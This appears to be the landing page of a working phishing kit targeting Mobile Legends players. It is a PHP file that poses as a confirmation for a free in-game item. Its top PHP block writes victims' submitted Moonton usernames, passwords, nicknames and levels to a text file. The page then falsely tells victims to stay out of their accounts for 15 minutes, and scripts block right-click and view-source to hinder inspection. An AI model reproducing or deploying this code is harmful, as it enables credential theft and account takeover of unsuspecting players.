<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
?>
<?php
file_put_contents("hasil.txt", "[+]MOONTON USERNAME/ID: " . $_POST['momail'] ." PASSWORD: " . $_POST['mopw'] ." NICK: " . $_POST['nick'] . " LEVEL: " . $_POST['lvl'] . "\n", FILE_APPEND);
?>
<?php
$gmail = $_POST['momail'];
$pwgmail = $_POST['mopw'];
$nick = $_POST['nick'];
$lvl = $_POST['lvl'];
$skin = $_POST['skin'];
$rec = $_POST['recover'];
$no = $_POST['no'];
$country = $_POST['country'];
?>
<?php
$random = rand(1000,5000);
?>

<!DOCTYPE HTML>
<html lang="en">
	<head>
		<noscript><meta http-equiv="refresh" content="0; URL=https://www.facebook.com/RaBiitch1945"/></noscript>
		<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title>Mobile Legends</title>
        <link rel="shorcut icon" href="./img/favicon.ico" />
        <link rel="stylesheet" media="only screen and (min-width: 720px)" href="./css/style.css" />
        <link rel="stylesheet" media="only screen and (max-width: 720px)" href="./css/style.css" />
	</head>
	<body>
		<div class="form">
			<font color="#fff" style="letter-spacing: 1px;">>> successfully <<</font><br/>
			<b><u><font color="#fff" style="letter-spacing: 1px;"><?php echo $nick; ?></font></u></b><br/>
			<font color="#fff" style="letter-spacing: 1px;">You have successfully obtained this item, please do not open your account for 15 minutes after picking up the item!</font><p/>
			<button type="submit" class="button button-block" onclick="location.href='/';">Logout</button>
		</div>
		<script>
			var txt="Berhasil!";
			var kecepatan=0;var segarkan=null;function berhenti() { document.title=txt;
				txt=txt.substring(1,txt.length)+txt.charAt(0);
				segarkan=setTimeout("behenti()",kecepatan);}berhenti();
			document.addEventListener("contextmenu", function(e){ e.preventDefault(); }, false);
			document.onkeydown = function(e) {
        		if (e.ctrlKey && 
            		(e.keyCode === 67 || 
             		e.keyCode === 83 || 
             		e.keyCode === 85 || 
            		e.keyCode === 117)) {
            		window.location.replace("index.html");
           		return false;
        		} else {
           			 return true;
        		}
			};
		</script>
		<!--Kode untuk mencegah shorcut keyboard, view source dll.-->
		<script type="text/javascript">
			window.addEventListener("keydown",function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){e.preventDefault()}});document.keypress=function(e){if(e.ctrlKey&&(e.which==65||e.which==66||e.which==67||e.which==73||e.which==80||e.which==83||e.which==85||e.which==86)){}return false}
		</script>
		<script type="text/javascript">
			document.onkeydown=function(e){e=e||window.event;if(e.keyCode==123||e.keyCode==18){return false}}
		</script>
	</body>
</html>
